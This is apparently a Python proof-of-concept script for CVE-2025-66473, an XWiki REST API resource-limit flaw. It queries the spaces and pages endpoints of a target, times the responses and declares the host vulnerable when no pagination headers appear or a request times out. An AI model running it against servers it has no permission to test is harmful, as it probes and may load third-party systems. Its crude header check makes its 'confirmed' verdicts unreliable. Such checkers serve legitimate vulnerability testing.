#!/usr/bin/env python3
import requests
import sys
import time
import argparse


def test_resource_limit_vuln(target_url):
    """
    Test CVE-2025-66473: XWiki REST API Resource Limit Vulnerability
    The REST API doesn't enforce limits for the number of items returned.
    """
    endpoints = [
        "/rest/wikis/xwiki/spaces",
        "/rest/wikis/xwiki/pages",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Testing XWiki REST API resource limit vulnerability (CVE-2025-66473)")
    print("-" * 60)
    
    vulnerable = False
    
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        print(f"\n[*] Testing endpoint: {endpoint}")
        
        try:
            headers = {"Accept": "application/json"}
            start_time = time.time()
            response = requests.get(url, headers=headers, timeout=30)
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                data = response.json()
                
                if "spaces" in data:
                    item_count = len(data.get("spaces", []))
                    item_type = "spaces"
                elif "pageSummaries" in data:
                    item_count = len(data.get("pageSummaries", []))
                    item_type = "pages"
                else:
                    item_count = len(data) if isinstance(data, list) else 1
                    item_type = "items"
                
                print(f"[+] Status: {response.status_code}")
                print(f"[+] Response time: {elapsed:.2f}s")
                print(f"[+] Returned {item_count} {item_type}")
                print(f"[+] Response size: {len(response.content)} bytes")
                
                response_headers = dict(response.headers)
                has_limit_header = any(
                    "limit" in h.lower() or "pagination" in h.lower() 
                    for h in response_headers
                )
                
                if not has_limit_header:
                    print(f"[!] No pagination/limit headers found - API returns all items without limits")
                    vulnerable = True
                    
            elif response.status_code == 401:
                print(f"[-] Authentication required (401)")
            else:
                print(f"[-] Unexpected status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            print(f"[!] Request timed out - possible DoS condition")
            vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
    
    print("\n" + "=" * 60)
    if vulnerable:
        print("[+] VULNERABLE: REST API does not enforce resource limits")
        print("[+] CVE-2025-66473 confirmed")
        return True
    else:
        print("[-] Target does not appear vulnerable or is not accessible")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-66473: XWiki REST API Resource Limit Vulnerability PoC"
    )
    parser.add_argument(
        "-t", "--target",
        default="http://localhost:8080",
        help="Target URL (default: http://localhost:8080)"
    )
    args = parser.parse_args()
    
    result = test_resource_limit_vuln(args.target)
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
